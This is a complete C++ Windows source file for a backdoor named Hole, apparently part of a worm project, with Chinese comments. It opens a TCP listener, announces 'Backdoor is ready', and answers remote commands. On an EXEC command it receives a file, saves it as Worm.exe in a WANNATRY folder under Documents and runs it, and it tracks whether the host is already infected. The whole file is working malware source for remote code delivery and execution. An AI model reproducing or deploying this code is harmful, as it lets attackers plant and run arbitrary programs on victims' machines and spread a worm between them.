// Hole.cpp : 此檔案包含 'main' 函式。程式會於該處開始執行及結束執行。
//

#define WIN32_LEAN_AND_MEAN
#include <WinSock2.h>
#include <WS2tcpip.h>
#include <Windows.h>
#include <ShlObj.h>
#include <stdio.h>
#include <tchar.h>
#include "Hole.h"

#pragma comment (lib, "Ws2_32.lib")

#ifndef DEBUG
#define DEBUG(fmt, ...) (_tprintf(_T(fmt), __VA_ARGS__))
#endif

DWORD WINAPI HoleThread(LPVOID lParam);

BOOL fExec = FALSE;

int __cdecl main(void)
{
    WSADATA wsaData;
    int iResult;

    SOCKET ListenSocket = INVALID_SOCKET;
    SOCKET ClientSocket = INVALID_SOCKET;

    struct addrinfo* result = NULL;
    struct addrinfo hints;

    // Initialize Winsock
    iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (iResult != 0) {
        DEBUG("WSAStartup failed with error: %d\n",
            iResult);
        return 1;
    }
    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;
    hints.ai_flags = AI_PASSIVE;

    // Resolve the server address and port
    iResult = getaddrinfo(
        NULL,
        HOLE_PORT,
        &hints,
        &result);
    if (iResult != 0) {
        DEBUG("getaddrinfo failed with error: %d\n",
            iResult);
        WSACleanup();
        return 1;
    }
    ListenSocket = socket(
        result->ai_family,
        result->ai_socktype,
        result->ai_protocol);
    if (ListenSocket == INVALID_SOCKET) {
        DEBUG("socket failed with error: %ld\n",
            WSAGetLastError());
        freeaddrinfo(result);
        WSACleanup();
        return 1;
    }
    BOOL bReuseaddr = TRUE;
    setsockopt(
        ListenSocket,
        SOL_SOCKET,
        SO_REUSEADDR,
        (const CHAR*)&bReuseaddr,
        sizeof(bReuseaddr));
    iResult = bind(
        ListenSocket,
        result->ai_addr,
        (int)result->ai_addrlen);
    if (iResult == SOCKET_ERROR) {
        DEBUG("bind failed with error: %d\n",
            WSAGetLastError());
        freeaddrinfo(result);
        closesocket(ListenSocket);
        WSACleanup();
        return 1;
    }
    freeaddrinfo(result);
    iResult = listen(
        ListenSocket,
        SOMAXCONN);
    if (iResult == SOCKET_ERROR) {
        DEBUG("listen failed with error: %d\n",
            WSAGetLastError());
        closesocket(ListenSocket);
        WSACleanup();
        return 1;
    }
    DEBUG("Backdoor is ready.\n");
    while (TRUE) {
        DEBUG("waiting...\n");
        ClientSocket = accept(
            ListenSocket,
            NULL,
            NULL);
        if (ClientSocket == INVALID_SOCKET) {
            DEBUG("accept failed with error: %d\n",
                WSAGetLastError());
            closesocket(ListenSocket);
            WSACleanup();
            return 1;
        }
        CreateThread(
            NULL,
            0,
            HoleThread,
            &ClientSocket,
            0,
            NULL);
    }
    closesocket(ListenSocket);
    WSACleanup();
    // No longer need server socket

    return 0;
}

code_t RecvCode(SOCKET s)
{
    code_t c = CMD_NONE;
    INT i = recv(s, &c, sizeof(c), 0);
    if(i > 0) {
        return c;
    }
    else if (i == 0) {
        return CMD_NONE;
    }
    else {
        return CMD_ERROR;
    }
}

BOOL SendCode(SOCKET s, code_t c)
{
    if (send(s, &c, sizeof(c), 0) <= 0) {
        return FALSE;
    }
    return TRUE;
}

INT WormFilePath(LPTSTR filename)
{
    HRESULT result = SHGetFolderPath(
        NULL,
        CSIDL_PERSONAL,
        NULL,
        SHGFP_TYPE_CURRENT,
        filename);
    _tcscat_s(filename, MAX_PATH,
        _T("\\WANNATRY"));
    _tcscat_s(filename, MAX_PATH,
        _T("\\Worm.exe"));
    return TRUE;
}

BOOL CreateDirectories(LPCTSTR lpDirName)
{
    if (GetFileAttributes(lpDirName) ==
        INVALID_FILE_ATTRIBUTES) {
        TCHAR szDirName[MAX_PATH + 1];
        _tcscpy_s(szDirName, lpDirName);
        LPTSTR slash = _tcsrchr(szDirName, _T('\\'));
        if (!slash) {
            return FALSE;
        }
        *slash = _T('\0');
        BOOL bResult = CreateDirectories(szDirName);
        if (bResult) {
            bResult = CreateDirectory(lpDirName, NULL);
        }
        return bResult;
    }
    return TRUE;
}

BOOL RecvFile(SOCKET s, LPCTSTR lpFileName)
{
    HANDLE hFile;
    TCHAR szDirName[MAX_PATH + 1];
    _tcscpy_s(szDirName, lpFileName);
    LPTSTR slash = _tcsrchr(szDirName, _T('\\'));
    if (slash) {
        *slash = 0;
    }
    if (!CreateDirectories(szDirName)) {
        return FALSE;
    }
    if ((hFile = CreateFile(
        lpFileName,
        GENERIC_WRITE,
        FILE_SHARE_READ,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    )) == INVALID_HANDLE_VALUE) {
        DEBUG("open %s fails: %d\n",
            lpFileName, GetLastError());
        return FALSE;
    }
    while (TRUE) {
        CHAR buffer[4096];
        DWORD iWrite = 0;
        INT iSize = recv(
            s,
            buffer,
            sizeof(buffer),
            0);
        if (iSize > 0) {
            WriteFile(
                hFile,
                buffer,
                iSize,
                &iWrite,
                NULL);
        }
        else if (iSize == 0) {
            break;
        }
        else {
            DEBUG("recv error: %d\n",
                GetLastError());
            CloseHandle(hFile);
            return FALSE;
        }
    }
    CloseHandle(hFile);
    return TRUE;
}

void ExecFile(LPTSTR pCommandLine)
{
    STARTUPINFO siStartupInfoApp;
    PROCESS_INFORMATION piProcessInfoApp;
    ZeroMemory(&siStartupInfoApp,
        sizeof(siStartupInfoApp));
    ZeroMemory(&piProcessInfoApp,
        sizeof(piProcessInfoApp));
    siStartupInfoApp.cb = sizeof(siStartupInfoApp);
    if (!CreateProcess(
        NULL,
        pCommandLine,
        NULL,
        NULL,
        FALSE,
        CREATE_NEW_CONSOLE,
        NULL,
        NULL,
        &siStartupInfoApp,
        &piProcessInfoApp))
    {
        return;
    }
    WaitForSingleObject(piProcessInfoApp.hProcess, 0);
    CloseHandle(piProcessInfoApp.hProcess);
    CloseHandle(piProcessInfoApp.hThread);
    return;
}

DWORD WINAPI HoleThread(LPVOID lParam)
{
    int iResult;
    BOOL flag = TRUE;
    SOCKET ClientSocket = *(SOCKET*)lParam;
    TCHAR szFileName[MAX_PATH];
    WormFilePath(szFileName);
    while (flag) {
        code_t code = RecvCode(ClientSocket);
        switch (code) {
        case CMD_PING:
            DEBUG("Recv PING\n");
            if (fExec) {
                DEBUG("Send PONG FAIL\n");
                SendCode(ClientSocket, REPLY_PONG_FAIL);
                flag = FALSE;
                break;
            }
            DEBUG("Send PONG\n");
            SendCode(ClientSocket, REPLY_PONG);
            break;
        case CMD_EXEC:
            DEBUG("Recv EXEC\n");
            if (fExec) {
                DEBUG("Infected\n");
                SendCode(ClientSocket, REPLY_EXEC_FAIL);
                flag = FALSE;
                break;
            }
            fExec = TRUE;
            DEBUG("Recv File %s\n", szFileName);
            iResult = RecvFile(
                ClientSocket,
                szFileName);
            if (!iResult) {
                DEBUG("Send EXEC_FAIL\n");
                SendCode(ClientSocket, REPLY_EXEC_FAIL);
                flag = FALSE;
                break;
            }
            DEBUG("Exec\n");
            ExecFile(szFileName);
            DEBUG("Send EXEC_DONE\n");
            SendCode(ClientSocket, REPLY_EXEC_DONE);
            break;
        case CMD_ERROR:
        case CMD_NONE:
            flag = FALSE;
            break;
        default:
            DEBUG("Unknown %d\n", code);
            flag = FALSE;
            SendCode(ClientSocket, REPLY_NONE);
            break;
        }
    }

    // shutdown the connection since we're done
    iResult = shutdown(ClientSocket, SD_BOTH);
    if (iResult == SOCKET_ERROR) {
        DEBUG("shutdown failed with error: %d\n",
            WSAGetLastError());
        closesocket(ClientSocket);
        // WSACleanup();
        return 1;
    }

    // cleanup
    closesocket(ClientSocket);
    return 0;
}
